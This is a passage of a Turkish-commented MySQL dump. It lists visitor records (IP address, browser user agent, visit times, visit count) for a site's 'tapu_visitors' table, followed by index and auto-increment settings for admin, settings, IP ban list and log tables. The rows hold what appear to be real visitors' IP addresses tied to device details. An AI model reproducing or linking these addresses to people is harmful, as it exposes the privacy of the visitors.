(104, '151.250.56.37', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36', '2026-07-06 15:43:17', '2026-07-06 15:56:15', 6),
(109, '78.166.192.210', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36', '2026-07-06 15:43:59', '2026-07-06 15:52:21', 4),
(116, '37.154.85.168', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:44:52', '2026-07-06 15:44:52', 1),
(123, '91.231.89.98', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', '2026-07-06 15:45:41', '2026-07-06 15:45:41', 1),
(124, '178.241.74.108', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 Mobile/15E148 Safari/604.1', '2026-07-06 15:45:48', '2026-07-06 15:45:48', 1),
(125, '172.85.102.169', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', '2026-07-06 15:45:51', '2026-07-06 15:45:51', 1),
(142, '37.155.233.89', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/426.7.931869700 Mobile/15E148 Safari/604.1', '2026-07-06 15:48:02', '2026-07-06 15:49:06', 5),
(152, '94.54.248.223', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:48:41', '2026-07-06 15:52:01', 3),
(153, '176.239.197.15', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:48:46', '2026-07-06 16:27:56', 30),
(154, '176.89.99.17', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:48:47', '2026-07-06 15:50:05', 4),
(157, '178.247.161.82', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/149.0.7827.137 Mobile/15E148 Safari/604.1', '2026-07-06 15:49:05', '2026-07-06 15:49:05', 1),
(160, '91.196.152.224', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', '2026-07-06 15:49:11', '2026-07-06 15:49:11', 1),
(173, '91.231.89.103', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', '2026-07-06 15:50:22', '2026-07-06 15:50:22', 1),
(182, '66.249.81.74', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', '2026-07-06 15:51:04', '2026-07-06 16:07:22', 2),
(203, '54.164.172.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1', '2026-07-06 15:53:36', '2026-07-06 17:43:18', 3),
(204, '3.90.143.74', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1', '2026-07-06 15:53:39', '2026-07-06 15:53:39', 1),
(210, '66.249.81.72', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', '2026-07-06 15:54:17', '2026-07-06 15:54:17', 1),
(217, '178.243.104.133', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36', '2026-07-06 15:55:18', '2026-07-06 16:43:03', 20),
(218, '103.196.9.119', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 15:55:25', '2026-07-06 15:55:25', 1),
(219, '103.4.250.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 15:55:26', '2026-07-06 15:55:36', 2),
(220, '178.246.215.183', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.5.2 Mobile/15E148 Safari/604.1', '2026-07-06 15:55:33', '2026-07-06 15:57:48', 9),
(222, '98.92.112.254', 'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1', '2026-07-06 15:55:52', '2026-07-06 15:56:03', 2),
(225, '82.24.170.176', 'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1', '2026-07-06 15:55:53', '2026-07-06 15:55:53', 1),
(256, '5.133.192.192', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Viewer/99.9.8853.8', '2026-07-06 15:59:58', '2026-07-06 15:59:58', 1),
(267, '217.131.97.105', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.5.2 Mobile/15E148 Safari/604.1', '2026-07-06 16:02:10', '2026-07-06 16:02:10', 1),
(299, '23.230.140.33', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '2026-07-06 16:12:08', '2026-07-06 16:12:08', 1),
(300, '104.252.191.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 16:12:09', '2026-07-06 16:12:15', 2),
(301, '103.4.251.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 16:12:10', '2026-07-06 16:12:10', 1),
(306, '157.173.126.24', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', '2026-07-06 16:14:55', '2026-07-06 16:14:55', 1),
(307, '216.73.217.162', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)', '2026-07-06 16:19:04', '2026-07-06 16:19:04', 1),
(311, '178.128.41.216', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0', '2026-07-06 16:25:02', '2026-07-06 16:25:02', 1),
(316, '162.252.198.25', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', '2026-07-06 16:27:36', '2026-07-06 16:27:36', 1),
(319, '104.197.69.115', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', '2026-07-06 16:28:00', '2026-07-06 16:28:00', 1),
(320, '82.24.246.121', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36', '2026-07-06 16:28:05', '2026-07-06 16:28:05', 1),
(321, '205.169.39.5', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', '2026-07-06 16:28:07', '2026-07-06 16:28:07', 1),
(324, '85.17.145.115', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36', '2026-07-06 16:37:48', '2026-07-06 16:37:48', 1),
(325, '107.172.195.173', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 16:40:43', '2026-07-06 16:41:08', 3),
(326, '154.28.229.148', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 16:40:49', '2026-07-06 16:40:49', 1),
(329, '68.183.50.179', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0', '2026-07-06 16:41:35', '2026-07-06 16:41:35', 1),
(332, '172.236.122.62', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36', '2026-07-06 16:44:05', '2026-07-06 16:44:05', 1),
(333, '85.137.57.233', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '2026-07-06 16:46:34', '2026-07-06 16:49:57', 7),
(337, '34.90.96.148', 'Scrapy/2.16.0 (+https://scrapy.org)', '2026-07-06 16:47:36', '2026-07-06 16:47:36', 1),
(340, '139.99.237.180', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', '2026-07-06 16:49:22', '2026-07-06 16:51:30', 5),
(343, '205.169.39.148', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36', '2026-07-06 16:49:44', '2026-07-06 16:49:49', 2),
(346, '38.49.218.212', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', '2026-07-06 16:50:01', '2026-07-06 16:50:01', 1),
(350, '34.240.143.132', 'Plesk screenshot bot https://support.plesk.com/hc/en-us/articles/10301006946066', '2026-07-06 16:58:58', '2026-07-06 17:12:51', 2),
(351, '67.215.237.243', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36', '2026-07-06 17:11:02', '2026-07-06 17:11:02', 1),
(356, '209.38.38.82', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 +https://forestengine.net/#opt-out', '2026-07-06 17:12:43', '2026-07-06 17:12:43', 1),
(360, '104.168.56.78', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 (Silvy X Ran)', '2026-07-06 17:12:53', '2026-07-06 17:12:53', 1),
(363, '46.101.111.185', 'Mozilla/5.0 (l9scan/2.0.4373e213e2138313e253; +https://leakix.net)', '2026-07-06 17:13:53', '2026-07-06 17:14:21', 4),
(364, '96.41.38.202', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0', '2026-07-06 17:13:58', '2026-07-06 17:16:02', 3),
(367, '129.227.46.139', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36', '2026-07-06 17:14:08', '2026-07-06 17:14:08', 1),
(371, '8.212.160.59', 'Go-http-client/1.1', '2026-07-06 17:15:29', '2026-07-06 17:15:29', 1),
(372, '104.164.126.149', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 17:15:34', '2026-07-06 17:15:40', 2),
(373, '154.28.229.112', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', '2026-07-06 17:15:34', '2026-07-06 17:15:34', 1),
(374, '8.211.199.59', 'Go-http-client/1.1', '2026-07-06 17:15:38', '2026-07-06 17:15:38', 1),
(377, '165.22.244.180', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0', '2026-07-06 17:16:07', '2026-07-06 17:16:07', 1),
(378, '93.180.200.134', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/144.0.7559.95 Mobile/15E148 Safari/604.1', '2026-07-06 17:16:07', '2026-07-06 17:16:07', 1),
(379, '203.78.175.46', 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/144.0.7559.95 Mobile/15E148 Safari/604.1', '2026-07-06 17:16:17', '2026-07-06 17:16:17', 1),
(382, '74.7.242.3', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.4; +https://openai.com/gptbot)', '2026-07-06 17:18:11', '2026-07-06 17:18:11', 1),
(384, '62.210.198.160', 'python-httpx/0.28.1', '2026-07-06 17:20:00', '2026-07-06 17:20:02', 2),
(390, '152.42.132.51', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', '2026-07-06 17:22:49', '2026-07-06 17:22:49', 1),
(391, '44.227.127.2', 'Go-http-client/2.0', '2026-07-06 17:23:40', '2026-07-06 17:23:40', 2),
(394, '172.111.15.17', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1', '2026-07-06 17:24:07', '2026-07-06 17:24:07', 1),
(395, '157.143.3.35', 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36', '2026-07-06 17:24:07', '2026-07-06 17:24:07', 1),
(396, '118.193.33.130', 'curl/7.29.0', '2026-07-06 17:24:39', '2026-07-06 17:24:39', 1),
(397, '152.32.132.203', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 9_2) AppleWebKit/541.51 (KHTML, like Gecko) Chrome/90.0.2041 Safari/537.36', '2026-07-06 17:25:14', '2026-07-06 17:25:14', 1),
(405, '167.250.109.20', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', '2026-07-06 17:25:39', '2026-07-06 17:25:39', 1),
(406, '51.158.248.247', 'python-httpx/0.28.1', '2026-07-06 17:25:46', '2026-07-06 17:25:49', 2),
(407, '44.223.109.160', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1', '2026-07-06 17:25:48', '2026-07-06 17:26:36', 2),
(412, '107.172.195.8', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 17:27:53', '2026-07-06 17:28:07', 2),
(413, '107.172.195.47', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', '2026-07-06 17:27:55', '2026-07-06 17:27:55', 1),
(415, '63.32.88.61', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36', '2026-07-06 17:28:42', '2026-07-06 17:28:42', 1),
(420, '35.90.75.0', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G965U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36', '2026-07-06 17:29:02', '2026-07-06 17:29:02', 2),
(422, '93.158.91.241', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604', '2026-07-06 17:29:59', '2026-07-06 17:29:59', 1),
(426, '91.231.89.102', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', '2026-07-06 17:31:53', '2026-07-06 17:31:53', 1),
(428, '118.194.251.101', 'curl/7.29.0', '2026-07-06 17:32:38', '2026-07-06 17:32:38', 1),
(430, '52.205.183.147', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15', '2026-07-06 17:33:10', '2026-07-06 17:33:10', 1),
(431, '165.154.163.113', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0) AppleWebKit/548.40 (KHTML, like Gecko) Chrome/90.0.1731 Safari/537.36', '2026-07-06 17:33:18', '2026-07-06 17:33:18', 1),
(432, '205.169.39.4', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36', '2026-07-06 17:33:22', '2026-07-06 17:33:22', 1),
(433, '54.145.77.120', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36', '2026-07-06 17:33:31', '2026-07-06 17:33:31', 1),
(450, '3.86.235.39', 'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1', '2026-07-06 17:38:59', '2026-07-06 17:39:13', 2),
(451, '82.24.170.138', 'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1', '2026-07-06 17:38:59', '2026-07-06 17:38:59', 1),
(453, '95.177.8.90', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', '2026-07-06 17:39:17', '2026-07-06 17:39:17', 1),
(455, '91.196.152.44', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', '2026-07-06 17:39:59', '2026-07-06 17:39:59', 1),
(464, '98.92.126.17', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1', '2026-07-06 17:42:53', '2026-07-06 17:43:49', 2),
(481, '165.227.142.164', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0', '2026-07-06 17:45:25', '2026-07-06 17:45:25', 1),
(494, '35.94.226.28', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.46 Safari/537.36', '2026-07-06 17:48:54', '2026-07-06 17:49:00', 2);

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `tapu_admin`
--
ALTER TABLE `tapu_admin`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Tablo için indeksler `tapu_ayarlar`
--
ALTER TABLE `tapu_ayarlar`
  ADD PRIMARY KEY (`anahtar`);

--
-- Tablo için indeksler `tapu_ip_banlist`
--
ALTER TABLE `tapu_ip_banlist`
  ADD PRIMARY KEY (`ip`);

--
-- Tablo için indeksler `tapu_logs`
--
ALTER TABLE `tapu_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_session` (`session_id`),
  ADD KEY `idx_durum` (`durum`),
  ADD KEY `idx_aktivite` (`son_aktivite`);

--
-- Tablo için indeksler `tapu_visitors`
--
ALTER TABLE `tapu_visitors`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uk_ip` (`ip`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `tapu_admin`
--
ALTER TABLE `tapu_admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `tapu_logs`
--
ALTER TABLE `tapu_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- Tablo için AUTO_INCREMENT değeri `tapu_visitors`
--
ALTER TABLE `tapu_visitors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=513;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
